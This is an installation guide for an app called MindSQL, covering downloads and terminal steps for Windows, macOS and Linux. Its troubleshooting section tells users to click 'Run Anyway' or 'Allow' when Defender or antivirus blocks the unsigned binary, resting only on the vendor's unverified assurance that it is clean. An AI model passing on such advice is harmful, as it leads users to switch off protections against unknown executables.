🚀 Installation Guide

Get MindSQL running on your machine in under 2 minutes.
Your OS will be auto-detected and highlighted below.

1. Windows (Recommended)

The easiest way to use MindSQL on a PC.

⊞ Download for Windows

Installation Steps

  1. Download the .exe file above.
  2. Double-click to launch the installer.
  3. Defender warning? Click More Info → Run Anyway. This is safe — we're an unsigned binary from a small team.
  4. Look for the small2big icon on your desktop. Done.

2. macOS (Apple Silicon & Intel)

High-performance AI for MacBooks.

Download for macOS

Installation Steps

  • # Move to your downloads folder:
  • $ cd ~/Downloads
  • # Grant permission to run:
  • $ chmod +x MindSQL-macos-latest

First Launch: Right-click the file in Finder → Open. Click Open again on the security prompt.

Pro Tip: This build is optimized with Apple Metal for faster SQL generation on M-series chips.

3. Linux (Ubuntu / Debian)

Fast, terminal-native SQL generation.

🐧 Download for Ubuntu

Installation Steps

  • # Make the binary executable:
  • $ chmod +x MindSQL-ubuntu-latest
  • # Run the application:
  • $ ./MindSQL-ubuntu-latest

Missing C++ libs? Run:
sudo apt install libstdc++6

🛠 Troubleshooting & Support

MindSQL won't open?

Ensure you downloaded the correct version for your OS. macOS users: always right-click → Open on first launch.

Blocked by antivirus?

Because this is an unsigned binary from our small2big team, some OS security settings may flag it. You can safely click Allow or Run Anyway — the binary is clean.

Linux app won't start?

Install the standard C++ runtime: sudo apt install libstdc++6, then try again.
